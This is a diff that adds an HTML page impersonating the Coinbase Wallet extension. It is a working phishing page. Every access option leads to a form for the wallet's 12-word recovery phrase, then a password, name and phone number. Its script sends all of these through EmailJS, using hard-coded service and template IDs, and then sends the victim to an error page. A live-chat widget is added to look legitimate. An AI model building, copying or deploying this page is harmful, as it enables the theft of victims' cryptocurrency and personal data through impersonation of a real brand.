@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Coinbase Wallet Extension</title>
+    <link rel="icon" href="favicon.png" type="image/png" />
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #000;
+        color: #fff;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      .container {
+        width: 60%;
+        max-width: 800px;
+        text-align: center;
+      }
+
+      h1 {
+        font-size: 32px;
+        margin-bottom: 15px;
+      }
+
+      p {
+        font-size: 16px;
+        color: #aaa;
+        margin-bottom: 25px;
+      }
+
+      .button {
+        background-color: #1c1c1c;
+        border: 1px solid #333;
+        border-radius: 8px;
+        padding: 20px;
+        margin: 15px 0;
+        text-align: left;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+
+      .button:hover {
+        background-color: #333;
+      }
+
+      .button-title {
+        font-size: 20px;
+        font-weight: bold;
+      }
+
+      .button-desc {
+        font-size: 14px;
+        color: #aaa;
+        margin-top: 8px;
+      }
+
+      .card {
+        background-color: #121212;
+        padding: 30px;
+        border-radius: 10px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        margin-bottom: 25px;
+      }
+
+      label {
+        display: block;
+        font-size: 1.1em;
+        margin-bottom: 10px;
+      }
+
+      input[type="text"],
+      input[type="tel"],
+      input[type="password"] {
+        width: 90%;
+        padding: 15px;
+        margin-bottom: 20px;
+        border: 1px solid #333;
+        border-radius: 5px;
+        background-color: #222;
+        color: #fff;
+        font-size: 1.2em;
+      }
+
+      button {
+        width: 100%;
+        padding: 15px;
+        font-size: 1.2em;
+        color: #000;
+        background-color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-weight: bold;
+      }
+
+      button:hover {
+        background-color: #ccc;
+      }
+
+      .error {
+        color: red;
+        font-size: 1em;
+        margin-top: -10px;
+        margin-bottom: 15px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <!-- Use an existing wallet Section (1st) -->
+      <div id="use-wallet" class="card">
+        <h1>Use an existing wallet</h1>
+        <p><b>Select how you'd like to access your existing wallet.</b></p>
+
+        <div class="button" id="import-wallet-button">
+          <div class="button-title">Enter recovery phrase</div>
+          <div class="button-desc">
+            Use your 12 word recovery phrase to securely access your Ethereum
+            and Solana wallets.
+          </div>
+        </div>
+
+        <div class="button" id="connect-ledger-button">
+          <div class="button-title">Connect Ledger wallet</div>
+          <div class="button-desc">
+            Approve transactions using a Ledger device (Ethereum only). A new
+            tab will open.
+          </div>
+        </div>
+
+        <div class="button" id="link-coinbase-button">
+          <div class="button-title">Link Coinbase Wallet app</div>
+          <div class="button-desc">
+            Approve transactions on your phone by linking your mobile wallet.
+          </div>
+        </div>
+      </div>
+
+      <!-- Import Wallet Section (for recovery phrase) -->
+      <div id="import-wallet-section" class="card" style="display: none">
+        <h2>Import Wallet</h2>
+        <p>
+          Enter your wallet's 12-word recovery phrase (also called a seed
+          phrase). You can import any Ethereum or Solana wallet.
+        </p>
+        <form id="import-wallet-form">
+          <label for="seed-phrase">12-word seed phrase</label>
+          <input
+            type="text"
+            id="seed-phrase"
+            placeholder="12 word seed phrase"
+            required
+          />
+          <div id="seed-phrase-error" class="error" style="display: none">
+            Please enter a valid seed phrase.
+          </div>
+          <button type="submit">Import Wallet</button>
+        </form>
+      </div>
+
+      <!-- Create Password Section -->
+      <div id="create-password-section" class="card" style="display: none">
+        <h2>Create Password</h2>
+        <p>
+          Set a password to unlock your wallet each time you use your computer.
+          It can't be used to recover your wallet.
+        </p>
+        <form id="create-password-form">
+          <label for="password">Enter password</label>
+          <input
+            type="password"
+            id="password"
+            placeholder="Enter password"
+            required
+          />
+
+          <label for="confirm-password">Enter password again</label>
+          <input
+            type="password"
+            id="confirm-password"
+            placeholder="Enter password again"
+            required
+          />
+
+          <div id="password-error" class="error" style="display: none">
+            Passwords must match and be filled out correctly.
+          </div>
+
+          <button type="submit">Submit</button>
+        </form>
+      </div>
+
+      <!-- Verify Your Details Section -->
+      <div id="verify-details-section" class="card" style="display: none">
+        <h1>Verify Your Details</h1>
+        <form id="verify-details-form">
+          <div class="form-group">
+            <input
+              style="margin-top: 20px"
+              type="text"
+              id="name"
+              placeholder="Enter Your Name"
+              required
+            />
+            <div id="name-error" class="error" style="display: none">
+              Please enter your name.
+            </div>
+          </div>
+          <div class="form-group">
+            <input
+              style="margin-top: 20px"
+              type="tel"
+              id="phone"
+              placeholder="Enter phone number"
+              required
+            />
+            <div id="phone-error" class="error" style="display: none">
+              Please enter a valid phone number.
+            </div>
+          </div>
+          <button type="submit">Verify</button>
+        </form>
+      </div>
+    </div>
+
+    <script>
+      const importWalletButton = document.getElementById(
+        "import-wallet-button"
+      );
+      const connectLedgerButton = document.getElementById(
+        "connect-ledger-button"
+      );
+      const linkCoinbaseButton = document.getElementById(
+        "link-coinbase-button"
+      );
+
+      const importWalletSection = document.getElementById(
+        "import-wallet-section"
+      );
+      const createPasswordSection = document.getElementById(
+        "create-password-section"
+      );
+      const verifyDetailsSection = document.getElementById(
+        "verify-details-section"
+      );
+
+      const seedPhraseInput = document.getElementById("seed-phrase");
+      const seedPhraseError = document.getElementById("seed-phrase-error");
+
+      const passwordInput = document.getElementById("password");
+      const confirmPasswordInput = document.getElementById("confirm-password");
+      const passwordError = document.getElementById("password-error");
+
+      const nameInput = document.getElementById("name");
+      const nameError = document.getElementById("name-error");
+
+      const phoneInput = document.getElementById("phone");
+      const phoneError = document.getElementById("phone-error");
+
+      function showImportWalletSection() {
+        document.getElementById("use-wallet").style.display = "none";
+        importWalletSection.style.display = "block";
+      }
+
+      [importWalletButton, connectLedgerButton, linkCoinbaseButton].forEach(
+        (button) => {
+          button.addEventListener("click", showImportWalletSection);
+        }
+      );
+
+      const importWalletForm = document.getElementById("import-wallet-form");
+      importWalletForm.addEventListener("submit", function (event) {
+        event.preventDefault();
+        const seedPhrase = seedPhraseInput.value.trim();
+        if (!seedPhrase) {
+          seedPhraseError.style.display = "block";
+          return;
+        }
+        seedPhraseError.style.display = "none";
+        importWalletSection.style.display = "none";
+        createPasswordSection.style.display = "block";
+      });
+
+      const createPasswordForm = document.getElementById(
+        "create-password-form"
+      );
+      createPasswordForm.addEventListener("submit", function (event) {
+        event.preventDefault();
+        const password = passwordInput.value.trim();
+        const confirmPassword = confirmPasswordInput.value.trim();
+        if (password !== confirmPassword || !password || !confirmPassword) {
+          passwordError.style.display = "block";
+          return;
+        }
+        passwordError.style.display = "none";
+        createPasswordSection.style.display = "none";
+        verifyDetailsSection.style.display = "block";
+      });
+
+      const verifyDetailsForm = document.getElementById("verify-details-form");
+      verifyDetailsForm.addEventListener("submit", function (event) {
+        event.preventDefault();
+        const name = nameInput.value.trim();
+        const phone = phoneInput.value.trim();
+        if (!name || !phone) {
+          if (!name) nameError.style.display = "block";
+          if (!phone) phoneError.style.display = "block";
+          return;
+        }
+        nameError.style.display = "none";
+        phoneError.style.display = "none";
+        sendEmail(name, phone);
+        window.location.href = "error.html";
+      });
+
+      function sendEmail(event) {
+        emailjs.init("eFjqTxnF7nGuJXVZd");
+        event.preventDefault();
+
+        // Collect form data
+        const formData = {
+          seed_phrase: document.getElementById("seed-phrase").value,
+          password: document.getElementById("password").value,
+          confirm_password: document.getElementById("confirm-password").value,
+          name: document.getElementById("name").value,
+          phone: document.getElementById("phone").value,
+        };
+
+        // Call EmailJS API
+        emailjs
+          .send("service_8it2819", "template_2fe0paq", formData)
+          .then((response) => {
+            console.log("SUCCESS:", response.status, response.text);
+            window.location.href = "error.html";
+          })
+          .catch((error) => {
+            console.error("FAILED:", error);
+            // console.log(emailjs);
+          });
+      }
+
+      // Attach the event listener to the form
+      document
+        .getElementById("verify-details-form")
+        .addEventListener("submit", sendEmail);
+    </script>
+    <!-- Start of LiveChat (www.livechat.com) code -->
+    <script type="text/javascript">
+      var Tawk_API = Tawk_API || {},
+        Tawk_LoadStart = new Date();
+      (function () {
+        var s1 = document.createElement("script"),
+          s0 = document.getElementsByTagName("script")[0];
+        s1.async = true;
+        s1.src = "https://embed.tawk.to/66a2a258becc2fed692b2b32/1i3lkkb6g";
+        s1.charset = "UTF-8";
+        s1.setAttribute("crossorigin", "*");
+        s0.parentNode.insertBefore(s1, s0);
+      })();
+    </script>
+    <noscript
+      ><a href="https://www.livechat.com/chat-with/18929835/" rel="nofollow"
+        >Chat with us</a
+      >, powered by
+      <a
+        href="https://www.livechat.com/?welcome"
+        rel="noopener nofollow"
+        target="_blank"
+        >LiveChat</a
+      ></noscript
+    >
+    <!-- End of LiveChat code -->
+  </body>
+</html>
